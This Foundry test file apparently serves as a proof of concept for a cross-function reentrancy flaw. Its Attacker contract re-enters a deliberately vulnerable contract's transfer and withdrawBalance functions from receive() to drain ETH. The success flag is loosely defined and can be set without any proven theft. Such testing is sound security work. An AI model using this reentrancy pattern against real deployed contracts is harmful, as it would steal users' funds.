
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";
import {Reentrancy_cross_function} from "../src/Reentrancy_cross_function.sol";

contract TestReentrancyReentrancy_cross_function is Test {
    using stdStorage for StdStorage;

    Reentrancy_cross_function public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrancy_cross_function();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 0.01 ether && attackVal < type(uint128).max);

        // --- 2. State Configuration (Pre-Condition) ---
        // Set up initial balance for the attacker in the victim contract using stdstore
        // The userBalances mapping is at slot 0
        bytes32 slot = keccak256(abi.encode(address(_attacker), uint256(0)));
        vm.store(address(_contractUnderTest), slot, bytes32(attackVal));

        // --- 3. Funding ---
        // Fund the Victim contract so it has ETH to steal
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the Attacker
        vm.deal(address(_attacker), attackVal);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    Reentrancy_cross_function public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = Reentrancy_cross_function(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
    }

    function attack(uint256 val) public {
        // Capture Initial State before the attack
        initialSnapshot = address(this).balance;
        storedAttackVal = val;

        // Call the vulnerable withdrawBalance function
        _victim.withdrawBalance();

        // Verify Success: If we received more than the initial balance, the attack succeeded
        if (address(this).balance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
        
        // Also check if we called withdraw multiple times
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        if (attackCallCount < 2) {
            // Re-enter by calling transfer to move balance to ourselves before state is updated
            // This exploits the cross-function reentrancy where we can call transfer
            // while our balance hasn't been zeroed yet
            _victim.transfer(address(this), storedAttackVal);
            
            // Then withdraw again
            _victim.withdrawBalance();
        }
    }
}
